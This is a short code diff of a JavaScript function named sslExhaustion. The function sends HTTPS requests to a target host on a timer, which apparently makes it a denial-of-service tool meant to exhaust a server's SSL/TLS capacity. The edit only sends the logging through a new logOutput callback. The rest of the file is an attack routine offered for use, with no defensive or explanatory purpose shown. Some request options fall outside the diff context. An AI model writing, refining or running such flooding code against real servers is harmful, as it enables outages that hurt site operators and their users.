@@ -1,6 +1,6 @@
 const https = require('https');
 
-function sslExhaustion(target, rateLimit) {
+function sslExhaustion(target, rateLimit, logOutput) {
     setInterval(() => {
         const options = {
             hostname: target,
@@ -12,12 +12,12 @@ function sslExhaustion(target, rateLimit) {
 
         const req = https.request(options, (res) => {
             res.on('data', (chunk) => {
-                console.log('Received: ' + chunk);
+                logOutput('Received: ' + chunk);
             });
         });
 
         req.on('error', (err) => {
-            console.error('Error: ' + err.message);
+            logOutput('Error: ' + err.message);
         });
 
         req.end();
